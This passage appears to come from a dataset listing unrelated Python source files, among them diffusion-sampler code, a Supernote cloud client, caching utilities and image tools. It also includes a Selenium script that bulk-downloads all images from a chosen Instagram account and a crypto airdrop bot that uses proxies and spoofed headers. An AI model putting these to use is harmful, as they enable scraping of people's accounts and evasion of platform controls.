hasattr(k_diffusion.sampling, funcname)\r\n]\r\n\r\nsampler_extra_params = {\r\n    'sample_euler': ['s_churn', 's_tmin', 's_tmax', 's_noise'],\r\n    'sample_heun': ['s_churn', 's_tmin', 's_tmax', 's_noise'],\r\n    'sample_dpm_2': ['s_churn', 's_tmin', 's_tmax', 's_noise'],\r\n    'sample_dpm_fast': ['s_noise'],\r\n    'sample_dpm_2_ancestral': ['s_noise'],\r\n    'sample_dpmpp_2s_ancestral': ['s_noise'],\r\n    'sample_dpmpp_sde': ['s_noise'],\r\n    'sample_dpmpp_2m_sde': ['s_noise'],\r\n    'sample_dpmpp_3m_sde': ['s_noise'],\r\n}\r\n\r\nk_diffusion_samplers_map = {x.name: x for x in samplers_data_k_diffusion}\r\nk_diffusion_scheduler = {\r\n    'Automatic': None,\r\n    'karras': k_diffusion.sampling.get_sigmas_karras,\r\n    'exponential': k_diffusion.sampling.get_sigmas_exponential,\r\n    'polyexponential': k_diffusion.sampling.get_sigmas_polyexponential\r\n}\r\n\r\n\r\nclass CFGDenoiserKDiffusion(sd_samplers_cfg_denoiser.CFGDenoiser):\r\n    @property\r\n    def inner_model(self):\r\n        if self.mode",
    "import requests, os\nfrom hashlib import sha256, md5\n\n# thank you \n# https://github.com/adrianba/supernote-cloud-api/\n# https://github.com/colingourlay/supernote-cloud-api/\n\nAPI_BASE = \"https://cloud.supernote.com/api/\"\n\ndef _sha256_s(s):\n    return sha256(s.encode('utf-8')).hexdigest()\ndef _md5_s(s):\n    return md5(s.encode('utf-8')).hexdigest()\ndef _md5_b(b):\n    return md5(b).hexdigest()\n\ndef _post_json(path, payload, token=None):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"\n    }\n    if token is not None:\n        headers['x-access-token'] = token\n    response = requests.post(API_BASE+path, json=payload, headers=headers)\n    return response.json()\n\ndef _get_random_code(email):\n    # countrycode \n    payload = {'countryCode': \"1\", \"account\":email }\n    data = _post_json(\"official/user/query/random/code\", payload)\n    return (data['randomCode'], data['timestamp'])\n\ndef _get_access_token(email, password, rc, timestamp):\n    pd = _sha256_s(_md5_s(password) + rc);\n    payload = {'countryCode':1, 'account':email, 'password':pd, \n        'browser':'Chrome107', 'equipment':\"1\", \"loginMethod\":\"1\", \"timestamp\":timestamp, \"language\":\"en\"}\n    data = _post_json(\"official/user/account/login/new\", payload)\n    return data['token']\n\n# returns access token\ndef login(email, password):\n    (rc, timestamp) = _get_random_code(email)\n    return _get_access_token(email, password, rc, timestamp)\n\ndef file_list(token, directory=0):\n    payload = {\"directoryId\": directory, \"pageNo\":1, \"pageSize\":100, \"order\":\"time\", \"sequence\":\"desc\"}\n    data = _post_json(\"file/list/query\", payload, token=token)\n    return data['userFileVOList']\n\ndef download_file(token, id, filename=None):\n    payload = {\"id\":id, \"type\":0}\n    data = _post_json(\"file/download/url\", payload, token=token)\n    c = requests.get(data['url']).content\n    if(filename is not None):\n        f = open(filename,'wb')\n        f.write(c)\n        f.close()\n    else:\n        return c\n\ndef upload_file(token, filename, directory=0):\n    file_contents = open(filename,'rb').read()\n    data_md5 = _md5_b(file_contents)\n    payload = {'directoryId':directory, 'fileName':filename, 'md5':data_md5, 'size':len(file_contents)}\n    data = _post_json('file/upload/apply', payload, token=token)\n    if(data['success']):\n        put_headers = {'Authorization':data['s3Authorization'], 'x-amz-date':data['xamzDate'], \"x-amz-content-sha256\": \"UNSIGNED-PAYLOAD\"}\n        requests.put(data['url'], file_contents, headers=put_headers)\n        inner_name = os.path.basename(data['url'])\n        payload = {\"directoryId\":directory, \"fileName\":filename, \"fileSize\":len(file_contents), \"innerName\":inner_name,\"md5\":data_md5}\n        data = _post_json(\"file/upload/finish\", payload, token=token)\n    else:\n        print(\"Error: %s\" % (data['errorMsg']))\n\n# as an example, we download the latest NYT crossword and put it on the folder Document/puzzles\n# your auth.txt file in the current folder should have\n# username,password\n# NYT-cookie0 (load the NYT page and copy your cookies)\n# NYT-cookie1 (\"print\" a crossword and copy your cookies from that request)\nif __name__ == '__main__':\n    import nyt\n    uploaded=False\n    auth = open('auth.txt').read().split('\\n')\n    (username,password) = auth[0].split(',')\n    puzzle_fn = nyt.get(auth[1], auth[2])\n    if puzzle_fn is not None:\n        token = login(username, password)\n        if token is None:\n            print(\"Couldn't log into supernote\")\n        else:\n            for d in file_list(token):\n                if(d['isFolder']=='Y' and d['fileName']==\"Document\"): \n                    document_id = d['id']\n                    for d in file_list(token, document_id):\n                        if(d['isFolder']=='Y' and d['fileName']==\"puzzles\"): \n                            puzzles_id = d['id']\n                            upload_file(token, puzzle_fn, directory=puzzles_id)\n                            uploaded = True\n            if not uploaded:\n                print(\"Didn't upload puzzle. Check you have a puzzles folder in Document on Supernote cloud\")\n\n    else:\n        print(\"Problem downloading puzzle, bad NYT cookies?\")\n",
    "from functools import wraps\nfrom typing import Optional\n\nfrom qdrant_client import QdrantClient\n\nclient = QdrantClient(\":memory:\")\nout_store = {}\n\n\ndef semantic_cache(similarity_threshold: Optional[float] = None):\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            func_name = func.__name__\n            arg_desc = \", \".join([f\"arg{i}: {str(arg)}\" for i, arg in enumerate(args)])\n            kwarg_desc = \", \".join([f\"{k}={str(v)}\" for k, v in kwargs.items()])\n\n            params_str = f\"Function: {func_name}\\nArguments: {arg_desc}\\nKeyword Arguments: {kwarg_desc}\"\n\n            fn_cache_name = str(hash(func.__code__))\n            if client.collection_exists(fn_cache_name):\n                embeddings = client.query(\n                    collection_name=fn_cache_name,\n                    query_text=params_str,\n                    limit=1,\n                )\n                if embeddings:\n                    embedding = embeddings[0]\n                    key = (\n                        embedding.metadata[\"args\"],\n                        frozenset(embedding.metadata[\"kwargs\"].items()),\n                    )\n                    score = embedding.score\n                    if score >= (similarity_threshold or 0.95):\n                        if key in out_store:\n                            return out_store[key]\n\n            client.add(\n                documents=[params_str],\n                collection_name=fn_cache_name,\n                metadata=[{\"args\": args, \"kwargs\": kwargs}],\n                ids=[str(hash(params_str))],\n            )\n\n            out = func(*args, **kwargs)\n            key = (args, frozenset(kwargs.items()))\n            out_store[key] = out\n            return out\n\n        return wrapper\n\n    return decorator\n",
    "import os\nimport shutil\n\ndef copy_images_from_clusters(cluster_folder, dataset_folder):\n    # Get list of cluster folders\n    cluster_folders = [folder for folder in os.listdir(cluster_folder) if os.path.isdir(os.path.join(cluster_folder, folder))]\n\n    # Iterate through each cluster folder\n    for cluster_name in cluster_folders:\n        cluster_path = os.path.join(cluster_folder, cluster_name)\n        # Get list of image files in the cluster folder\n        image_files = [os.path.join(cluster_path, img) for img in os.listdir(cluster_path) if img.endswith('.jpg')]\n        \n        # Copy each image to the dataset folder\n        for img_file in image_files:\n            shutil.copy(img_file, dataset_folder)\n            print(f\"Copying {img_file} to {dataset_folder}\")\n\n    # Remove the 'dataset-clusters' folder after copying images\n    shutil.rmtree(cluster_folder)\n    print(f\"Removed {cluster_folder} after copying images.\")\n\nif __name__ == \"__main__\":\n    # Folder paths\n    cluster_folder = \"dataset-clusters\"  # Folder containing cluster folders\n    dataset_folder = \"dataset\"  # Destination folder to copy images\n    \n    # Call function to copy images from cluster folders back to dataset folder\n    copy_images_from_clusters(cluster_folder, dataset_folder)\n",
    "from gptcache.embedding import SentenceEmbedding\nfrom gptcache.embedding_storage import AnnoyEmbeddingStorage\n\n\nclass AnnoyHandler:\n    def __init__(\n        self,\n        embedding: SentenceEmbedding,\n        storage: AnnoyEmbeddingStorage,\n    ):\n        self.s = embedding\n        self.a = storage\n\n    def handle_add(self, id: int, context: str) -> dict:\n        \"\"\"\n        Adds a new query's embedding to the Annoy index using the query's unique ID as the key.\n\n        Parameters:\n        - query (Query): An instance of the Query model containing the 'id' and 'context'\n        of the query. The 'id' is used as the key in the Annoy index, and the 'context'\n        is the textual content from which the embedding is generated.\n\n        Returns:\n        - dict: A dictionary indicating the result of the operation. It returns\n        {\"status\": \"success\"} if the embedding is successfully added to the Annoy index.\n        In case of an exception, it returns {\"status\": \"error\", \"message\": str(e)},\n        where `e` is the exception raised during the operation.\n\n        Raises:\n        - Exception: Captures any exceptions raised during the embedding generation or\n        when adding the item to the Annoy index, and returns an error message as part\n        of the response.\n        \"\"\"\n        try:\n            # Create embedding for the query\n            query_embedding = self.s.to_embedding(context)\n\n            # Add the query to the Annoy index\n            self.a.add_item(id, query_embedding)\n        except Exception as e:\n            return {\"status\": \"error\", \"message\": str(e)}\n\n        return {\"status\": \"success\", \"message\": None}\n\n    def handle_query(self, context: str, distance_threshold: float) -> dict:\n        \"\"\"\n        Handles a query request by generating an embedding for the given context and querying\n        the Annoy index to find the closest neighbor and its distance.\n\n        TODO: Currently does not throw ay errors, but should be updated to handle exceptions.\n        However, note that we do not need a fallback flow nessasarily, as this is meant for performance.\n        If something goes wrong and we get a cache miss, we can live with it. Howver need to investigate\n        error conditions here.\n\n        Parameters:\n        - context (str): The textual content for which to find the closest matching item\n        in the Annoy index based on embedding similarity.\n        - distance_threshold (float, optional): The maximum distance between the query\n        embedding and a neighbor's embedding for the neighbor to be considered\n        sufficiently close. Defaults to 0.2.\n\n        Returns:\n        - dict: A dictionary containing the 'id' of the closest matching item (or `None`\n        if no such item is found within the threshold) and the 'distance' to this item\n        (or `None` if no item is within the threshold).\n        \"\"\"\n        print(f\"Querying with distance threshold: {distance_threshold}\")\n\n        # Create embedding for the query\n        query_embedding = self.s.to_embedding(context)\n\n        nn_ids, distances = self.a.get_nns_by_vector(query_embedding, n=1)\n        if len(nn_ids) > 0:\n            print(f\"Nearest neighbor ID: {nn_ids[0]}\")\n            print(f\"Distance: {distances[0]}\")\n            # Check if the closest neighbor is within the acceptable distance\n            if distances[0] <= distance_threshold:\n                print(\"Nearest neighbor found within the distance threshold.\")\n                return {\"id\": nn_ids[0], \"distance\": distances[0]}\n            else:\n                print(\"No neighbors found within the distance threshold.\")\n                return {\"id\": None, \"distance\": None}\n        else:\n            # Handles cases where the index is empty\n            print(\"No neighbors found in the index.\")\n            return {\"id\": None, \"distance\": None}\n\n    def rebuild_index(self):\n        \"\"\"\n        Rebuilds the Annoy index in the background after adding a new item.\n        \"\"\"\n        try:\n            self.a.build_index(num_trees=10)\n        except Exception as e:\n            print(f\"An error occurred while rebuilding the index: {str(e)}\")\n        # TODO: Persist index?\n        # annoy.save('your_index_file.ann')\n",
    "\r\n\"\"\"\r\nCreated By *Abdullah EL-Yamany*\r\n-------------------------------\r\n\"\"\"\r\n\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nimport time, urllib.request\r\n\r\ndriver = webdriver.Chrome()\r\ndriver.maximize_window()\r\ndriver.get(\"https://www.instagram.com/\")\r\n\r\ntime.sleep(2)\r\n\r\n# -------- Login ------- #\r\nwhile True:\r\n    try:\r\n        username = driver.find_element(By.CSS_SELECTOR, 'input[name=\"username\"]')\r\n        password = driver.find_element(By.CSS_SELECTOR, 'input[name=\"password\"]')\r\n        break\r\n    except:\r\n        time.sleep(3)\r\n\r\nusername.clear()\r\npassword.clear()\r\n\r\nusername.send_keys(\"xxxxxxxxxxxx\") # Write Email or Phone\r\npassword.send_keys(\"xxxxxxxxxxxx\") # Write Password\r\n\r\ntime.sleep(1)\r\nlogin = driver.find_element(By.CSS_SELECTOR, 'button[type=\"submit\"]').click()\r\n\r\n#save your login info?\r\nwhile True:\r\n    time.sleep(5)\r\n    try:\r\n        notnow = driver.find_element(By.XPATH, '//div[@class=\"_ac8f\"]/div[@role=\"button\"]').click()\r\n        break\r\n    except:\r\n        continue\r\n\r\n\r\n#turn on notif\r\ntime.sleep(2)\r\nnotnow2 = driver.find_element(By.XPATH, \"//button[contains(text(), 'Not Now')]\").click()\r\n\r\nname_search = \"xxxxxxxxxxxx\" # Write Username Of Account\r\n\r\nurl = f\"https://www.instagram.com/{name_search}/\"\r\n\r\ntime.sleep(3)\r\ndriver.get(url)\r\ntime.sleep(10)\r\n\r\n\r\n#scroll\r\nscrolldown=driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);var scrolldown=document.body.scrollHeight;return scrolldown;\")\r\nmatch=False\r\nposts = []\r\nwhile(match==False):\r\n    last_count = scrolldown\r\n    time.sleep(3)\r\n    scrolldown = driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);var scrolldown=document.body.scrollHeight;return scrolldown;\")\r\n\r\n    links = driver.find_elements(By.TAG_NAME, \"a\")\r\n    for link in links:\r\n        try:\r\n            post = link.get_attribute('href')\r\n        except:\r\n            continue\r\n        if post not in posts:\r\n            if '/p/' in post:\r\n                posts.append(post)\r\n\r\n\r\n    if last_count==scrolldown:\r\n        match=True\r\n\r\n\r\nimgs_link = []\r\nnumber = 1\r\n\r\n#get videos and images\r\ndownload_url = ''\r\nfor post in posts:\r\n    driver.get(post)\r\n    shortcode = driver.current_url.split('/')[-2]\r\n    num = 1\r\n    time.sleep(3)\r\n\r\n    main_div = driver.find_element(By.CSS_SELECTOR, 'div[class=\"x6s0dn4 x1dqoszc xu3j5b3 xm81vs4 x78zum5 x1iyjqo2 x1tjbqro\"]')\r\n\r\n    while True:\r\n        imgs = main_div.find_elements(By.CSS_SELECTOR, \"img[style='object-fit: cover;']\")\r\n        for img in imgs:\r\n            link = img.get_attribute('src')\r\n            if link not in imgs_link:\r\n                urllib.request.urlretrieve(link, f'img_{number}{shortcode}{num}.jpg')\r\n                num += 1\r\n                imgs_link.append(link)\r\n\r\n                time.sleep(5)\r\n\r\n        try:\r\n            driver.find_element(By.CSS_SELECTOR, 'button[aria-label=\"Next\"]').click()\r\n            time.sleep(3)\r\n        except:\r\n            number += 1\r\n            break\r\n",
    "import gradio as gr\nimport os\nimport string\n\nfrom modules import script_callbacks, shared, util\nfrom modules.ui_components import ResizeHandleRow, InputAccordion, FormColumn, FormRow\nfrom modules.paths_internal import default_output_dir\nimport modules.infotext_utils as parameters_copypaste\n\nfrom PIL import Image, ImageEnhance, ImageDraw\n\ndef on_ui_settings():\n    section = ('saving-paths', \"Paths for saving\")\n    shared.opts.add_option(\n        \"sd_image_editor_outdir\",\n        shared.OptionInfo(\n            util.truncate_path(os.path.join(default_output_dir, 'sd-image-editor')),\n            'Output directory for sd-image-editor',\n            component_args=shared.hide_dirs,\n            section=('saving-paths', \"Paths for saving\"),\n        )\n    )\n\n\ndef draw_bbox(img, crop_enabled, bbox_w, bbox_h, bbox_center_x, bbox_center_y):\n    if img is None:\n        return None\n    if crop_enabled:\n        # Calculate coordinates of bbox corners\n        w, h = img.size\n        left = (bbox_center_x - bbox_w/2)/100 * w \n        upper = (bbox_center_y - bbox_h/2)/100 * h\n        right = (bbox_center_x + bbox_w/2)/100 * w\n        lower = (bbox_center_y + bbox_h/2)/100 * h\n        # Check bounding condition\n        left = 0 if left < 0 else left\n        upper = 0 if upper < 0 else upper\n        right = w if right > w else right\n        lower = h if lower > h else lower\n        # Draw bounding box\n        TINT_COLOR = (0, 0, 0)  # Black\n        TRANSPARENCY = .6  # Degree of transparency, 0-100%\n        OPACITY = int(255 * TRANSPARENCY)\n        OUTLINE_OPACITY = int(255 * TRANSPARENCY * 1)\n        BBOX_COLOR = (220, 220, 220)\n        # Create a bounding box overlay\n        overlay = Image.new('RGBA', img.size, TINT_COLOR+(OPACITY,)) # Shade everything outside bbox\n        draw = ImageDraw.Draw(overlay)  # Create a context for drawing things on it\n        draw.rectangle(((left, upper), (right, lower)), \n                       fill=(255, 255, 255, 0), \n                       outline=BBOX_COLOR+(OUTLINE_OPACITY,),\n                       width=2) # Make bounding box transparent\n        # Draw lines separating each side into 3 parts\n        third_left = left*1/3 + right*2/3\n        third_right = left*2/3 + right*1/3\n        third_up = lower*1/3+upper*2/3\n        third_down = lower*2/3+upper*1/3\n        draw.line([(third_left, upper), (third_left, lower)], fill=BBOX_COLOR+(OUTLINE_OPACITY,), width=1)\n        draw.line([(third_right, upper), (third_right, lower)], fill=BBOX_COLOR+(OUTLINE_OPACITY,), width=1)\n        draw.line([(left, third_up), (right, third_up)], fill=BBOX_COLOR+(OUTLINE_OPACITY,), width=1)\n        draw.line([(left, third_down), (right, third_down)], fill=BBOX_COLOR+(OUTLINE_OPACITY,), width=1)\n        # Merge image with bounding box overlay with alpha composite\n        img = Image.alpha_composite(img, overlay) \n    return img\n\n\ndef store_original_input(img):\n    return img\n\n\ndef edit(img, degree, expand, flip, crop_enabled, bbox_w, bbox_h, bbox_center_x, bbox_center_y, interpolate_mode, color, contrast, brightness, sharpness):\n    if img is None:\n        return None\n    # Crop\n    if crop_enabled:\n        # Calculate coordinates of bbox corners\n        w, h = img.size\n        left = (bbox_center_x - bbox_w/2)/100 * w\n        upper = (bbox_center_y - bbox_h/2)/100 * h\n        right = (bbox_center_x + bbox_w/2)/100 * w\n        lower = (bbox_center_y + bbox_h/2)/100 * h\n        img = img.crop((left, upper, right, lower))\n    # Flip\n    if flip:\n        img = img.transpose(method=Image.Transpose.FLIP_LEFT_RIGHT)\n    # Rotate\n    if interpolate_mode == \"Nearest\":\n        resample_obj = Image.NEAREST\n    elif interpolate_mode == \"Bilinear\":\n        resample_obj = Image.BILINEAR\n    elif interpolate_mode == \"Bicubic\":\n        resample_obj = Image.BICUBIC\n    img = img.rotate(-degree, expand=expand, resample=resample_obj) # Rotate closewise\n    # Enhance\n    img_enhance = ImageEnhance.Color(img)\n    img = img_enhance.enhance(color)\n    img_enhance = ImageEnhance.Contrast(img)\n    img = img_enhance.enhance(contrast)\n    img_enhance = ImageEnhance.Brightness(img)\n    img = img_enhance.enhance(brightness)\n    img_enhance = ImageEnhance.Sharpness(img)\n    img = img_enhance.enhance(sharpness)\n    return img\n\n\ndef save_image(img):\n    from random import choices\n    # Generate filename\n    filename = ''.join(choices(string.ascii_letters + string.digits, k=12)) + \".png\"\n    # Construct path to save\n    os.makedirs(shared.opts.sd_image_editor_outdir, exist_ok=True)\n    # Save\n    img.save(os.path.join(shared.opts.sd_image_editor_outdir, filename), format=\"PNG\")\n    return\n\n\ndef open_folder():\n    # adopted from https://github.com/AUTOMATIC1111/stable-diffusion-webui/blob/20123d427b09901396133643be78f6b692393b0c/modules/util.py#L176-L208\n    \"\"\"Open a folder in the file manager of the respect OS.\"\"\"\n    # import at function level to avoid potential issues\n    import gradio as gr\n    import platform\n    import sys\n    import subp",
    "import asyncio\nimport random\nimport time\nimport requests\nimport json\nfrom web3 import Web3\nfrom web3.middleware import geth_poa_middleware\nfrom loguru import logger\nfrom eth_account.messages import encode_defunct\nfrom fake_useragent import UserAgent\n\n\nclass Xterio:\n    def __init__(self, address, private_key, user_agent, proxies_conf=None):\n        self.headers = {\n            'authority': 'api.xter.io',\n            'accept': '*/*',\n            'accept-language': 'zh-HK,zh-TW;q=0.9,zh;q=0.8',\n            'authorization': '',\n            'content-type': 'application/json',\n            'origin': 'https://xter.io',\n            'referer': 'https://xter.io/',\n            'sec-ch-ua': '\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"',\n            'sec-ch-ua-mobile': '?0',\n            'sec-ch-ua-platform': '\"Windows\"',\n            'sec-fetch-dest': 'empty',\n            'sec-fetch-mode': 'cors',\n            'sec-fetch-site': 'same-site',\n            'user-agent': user_agent,\n        }\n        self.address = address\n        self.private_key = private_key\n        self.proxies = proxies_conf\n        self.req_proxies = proxies_conf['proxies'] if self.proxies is not None else None\n        self.xter_rpc = \"https://xterio.alt.technology\"\n        self.bsc_rpc = \"https://bsc-pokt.nodies.app\"\n\n    def check_balance(self):\n        w3 = Web3(Web3.HTTPProvider(self.xter_rpc, request_kwargs=self.proxies))\n        balance = w3.eth.get_balance(self.address)\n\n        return balance\n\n    def deposit2xter(self, amount):\n        f = open('abi.json', 'r', encoding='utf-8')\n        contract_palio = json.load(f)['deposit']\n        abi = contract_palio['abi']\n        contract_address = Web3.to_checksum_address(contract_palio['contract'])\n\n        w3 = Web3(Web3.HTTPProvider(self.bsc_rpc, request_kwargs=self.proxies))\n        w3.middleware_onion.inject(geth_poa_middleware, layer=0)\n\n        contract = w3.eth.contract(address=contract_address, abi=abi)\n\n        amount = w3.to_wei(amount, 'ether')\n\n        gas = contract.functions.depositETH(200000, '0x').estimate_gas(\n            {\n                'from': self.address,\n                'value': amount,\n                'nonce': w3.eth.get_transaction_count(account=self.address)\n            }\n        )\n        transaction = contract.functions.depositETH(200000, '0x').build_transaction({\n            'from': self.address,\n            'gasPrice': w3.eth.gas_price,\n            'nonce': w3.eth.get_transaction_count(account=self.address),\n            'gas': gas,\n            'value': amount,\n        })\n        signed_transaction = w3.eth.account.sign_transaction(transaction, private_key=self.private_key)\n        tx_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)\n        w3.eth.wait_for_transaction_receipt(tx_hash)\n        logger.info(f\"\u5b58\u6b3ehash:{tx_hash.hex()}\")\n\n        logger.info(f\"deposit pending\u2026\u2026\")\n\n    def get_challenge(self):\n        response = requests.get(\n            f'https://api.xter.io/account/v1/login/wallet/{self.address.upper()}',\n            headers=self.headers,\n            proxies=self.req_proxies\n        )\n\n        res = response.json()\n        assert res['err_code'] == 0, \"\u83b7\u53d6challenge \u9519\u8bef\u2757\"\n\n        return res['data']['message']\n\n    def get_signature(self):\n        message = self.get_challenge()\n\n        encoded_msg = encode_defunct(text=message)\n        signed_msg = Web3().eth.account.sign_message(encoded_msg, private_key=self.private_key)\n        signature = signed_msg.signature.hex()\n\n        return signature\n\n    def sign_in(self):\n        signature = self.get_signature()\n        json_data = {\n            'address': self.address.upper(),\n            'type': 'eth',\n            'sign': signature,\n            'provider': 'METAMASK',\n            'invite_code': '',\n        }\n\n        response = requests.post('https://api.xter.io/account/v1/login/wallet', headers=self.headers, json=json_data,\n                                 proxies=self.req_proxies)\n        res = response.json()\n\n        assert res['err_code'] == 0, \"\u767b\u5f55\u51fa\u9519\uff01\"\n\n        id_token = res['data']['id_token']\n        self.headers['authorization'] = id_token\n        logger.info(\"\u767b\u5f55\u6210\u529f\u2714\")\n\n    def claim_egg(self):\n        f = open('abi.json', 'r', encoding='utf-8')\n        contract_palio = json.load(f)['palio_incubator']\n        abi = contract_palio['abi']\n        contract_address = Web3.to_checksum_address(contract_palio['contract'])\n\n        w3 = Web3(Web3.HTTPProvider(self.xter_rpc, request_kwargs=self.proxies))\n        w3.middleware_onion.inject(geth_poa_middleware, layer=0)\n\n        contract = w3.eth.contract(address=contract_address, abi=abi)\n\n        gas = contract.functions.claimEgg().estimate_gas(\n            {\n                'from': self.address,\n                'nonce': w3.eth.get_transaction_count(account=self.address)\n            }\n        )\n        transaction = contract.functions.claimEgg().build_transaction({\n            'gasPrice': w3.eth.gas_price,\n            'nonce':",
    "import functools\nimport math\nfrom functools import reduce\nfrom typing import Any, Callable, Mapping, Optional, Protocol, Sequence, Union\n\nimport gin\nimport seqio\nimport einops\n\nfrom absl import logging\nfrom .data_utils import resize_and_pad, get_default_vocabulary, \\\n    _remove_bars_from_frames, convert_video_dtype, sample_patches, append_eos_bos, \\\n    get_special_token_ids, flatten_parts, pad_to_bounding_box\nimport tensorflow as tf\n\nfrom config import *\nfrom .prompts import * \n\nFeatureType = Mapping[str, tf.Tensor]\nAUTOTUNE = tf.data.experimental.AUTOTUNE\n\ndef get_from_dict(data, keys):\n    \"\"\"Iterate nested dictionary\"\"\"\n    return reduce(dict.get, keys, data)\n\n@seqio.utils.map_over_dataset\ndef rekey(x, key_map=None):\n  \"\"\"Replace the feature keys according to the mapping in `key_map`.\n  For example, if the dataset returns examples of the format:\n  {'foo': 'something', 'bar': 'something else'}\n  and key_map = {'boo': 'foo', 'spar': 'bar'} then this function will return\n  examples with the format\n  {'boo': 'something', 'spar': 'something else'}\n  If a mapping is to an empty key or None, set the new key to an empty string.\n  Args:\n      x: an example to process.\n      key_map: dictionary mapping new keys to original keys\n  Returns:\n      A preprocessed example with the format listed above.\n  \"\"\"\n  if key_map:\n    return {\n        new_key: get_from_dict(x, old_key) if old_key else ''\n        for new_key, old_key in key_map.items()\n    }\n  return x\n\ndef flan_preprocessor(ds, sequence_length, name, prompt_type = 'llama2'):\n  prompt_template = PROPMPT_MANAGER[prompt_type]\n  vocab = get_default_vocabulary()\n\n  def to_inputs_and_targets(ex):\n    \n    prefix = tf.strings.join([prompt_template['B_INST'], prompt_template['SYS_PREFIX'], ex['inputs'], prompt_template['E_INST']], separator=' ')\n    encoded_prefix = vocab.encode_tf(prefix)\n    prefix_loss_weights = tf.zeros(tf.shape(encoded_prefix), tf.int32)\n    encoded_response = vocab.encode_tf(ex['targets'])\n    response_loss_weights = tf.ones(tf.shape(encoded_response), tf.int32)\n    targets = tf.concat([encoded_prefix, encoded_response], axis=0)\n    decoder_loss_weights = tf.concat([prefix_loss_weights, response_loss_weights], axis=0)\n\n    return {\n        'targets': targets,\n        'decoder_loss_weights': decoder_loss_weights,\n    }\n    \n  ds = ds.map(to_inputs_and_targets, num_parallel_calls=tf.data.experimental.AUTOTUNE)\n  \n  def _filter(ex):\n    return tf.math.reduce_sum(ex['decoder_loss_weights']) > 0\n\n  ds = ds.filter(_filter)\n  return ds\n\n# -----------------------------------------------------------------------------------------\n# NLP tasks\n# -----------------------------------------------------------------------------------------\n\ndef maybe_cast_seed(seed):\n  \"\"\"Cast seed to int64 if needed.\"\"\"\n  def _maybe_cast_seed(s):\n    if s.dtype == tf.int64 or s.dtype == tf.int32:\n      return s\n    return tf.cast(s, tf.int64)\n\n  # seed is either a Tensor or a pair of Tensors.\n  if isinstance(seed, tf.Tensor):\n    return _maybe_cast_seed(seed)\n  else:\n    return _maybe_cast_seed(seed[0]), _maybe_cast_seed(seed[1])\n\ndef single_example_select_random_chunk(\n    features: FeatureType,\n    seed: tf.Tensor,\n    output_features: Mapping[str, seqio.Feature],\n    max_length: Optional[int] = None,\n    feature_key: str = 'targets',\n    additional_feature_keys: Optional[Sequence[str]] = None,\n    passthrough_feature_keys: Optional[Sequence[str]] = None,\n    sequence_length: Optional[Mapping[str, int]] = None,\n    uniform_random_start: bool = False,\n    min_length: Optional[int] = None) -> FeatureType:\n  \"\"\"Token-preprocessor to extract one span of at most `max_length` tokens.\n\n  If the token sequence is longer than `max_length`, then we return a random\n  subsequence.  Otherwise, we return the full sequence.\n\n  This is generally followed by split_tokens.\n\n  Args:\n    features: Single example with `feature_key` containing a tokenized sequence.\n    seed: Random seed to be used.\n    output_features: Mapping of keys to features.\n    max_length: Typically specified in gin configs, takes priority over\n      sequence_length.\n    feature_key: Which feature to use from the dataset.\n    additional_feature_keys: Additional features to use. The same chunk will be\n      selected from these features as from the one specified in feature_key,\n      so they should all have the same length.\n    passthrough_feature_keys: Additional keys to pass through unchanged.\n    sequence_length: Used if max_length is not specified. Typically passed in\n      by the data pipeline. feature_key will be used to select the length.\n    uniform_random_start: If True, will select a starting point in\n      [-max_length + 1, n_tokens). If False, will select one of a set of chunks\n      offset by max_length. Both of these starting points try to ensure each\n      token has an equal probability of being included.\n    min_length: If specified, lengths of chunks will be selected uniformly at\n      random from [min_length,",
    "import cv2\nimport math\n\nsource = cv2.imread(\"/home/ankan_opencv/officework/indore-talk24-projects/Playing-with-Your-Mouse-With-OpenCV/dog.jpg\", 1)\nsource = cv2.resize(source, (680, 680))\n# /home/ankan_opencv/\n# Lists to store the points\ncenter = []\ncircumference = []\n\n\ndef drawCircle(action, x, y, flags, userdata):\n    # Referencing global variables\n    global center, circumference\n    # Action to be taken when left mouse button is pressed\n    if action == cv2.EVENT_LBUTTONDOWN:\n        center = [(x, y)]\n        # Mark the center\n        cv2.circle(source, center[0], 1, (255, 255, 0), 2, cv2.LINE_AA)\n\n        # Action to be taken when left mouse button is released\n    elif action == cv2.EVENT_LBUTTONUP:\n        circumference = [(x, y)]\n        # Calculate radius of the circle\n        radius = math.sqrt(\n            math.pow(center[0][0] - circumference[0][0], 2) + math.pow(center[0][1] - circumference[0][1], 2)\n        )\n        # Draw the circle\n        cv2.circle(source, center[0], int(radius), (0, 255, 0), 2, cv2.LINE_AA)\n        cv2.imshow(\"Window\", source)\n\n\n# Make a dummy image, will be useful to clear the drawing\ndummy = source.copy()\ncv2.namedWindow(\"Window\")\n# highgui function called when mouse events occur\ncv2.setMouseCallback(\"Window\", drawCircle)\nk = 0\n# loop until escape character is pressed\nwhile k != 27:\n\n    cv2.imshow(\"Window\", source)\n    cv2.putText(\n        source,\n        \"\"\"Choose center, and drag, Press ESC to exit and c to clear\"\"\",\n        (10, 30),\n        cv2.FONT_HERSHEY_SIMPLEX,\n        0.6,\n        (255, 255, 255),\n    )\n    k = cv2.waitKey(20) & 0xFF\n    # Another way of cloning, key low_c\n    if k == 99:\n        source = dummy.copy()\n\n\ncv2.destroyAllWindows()\n",
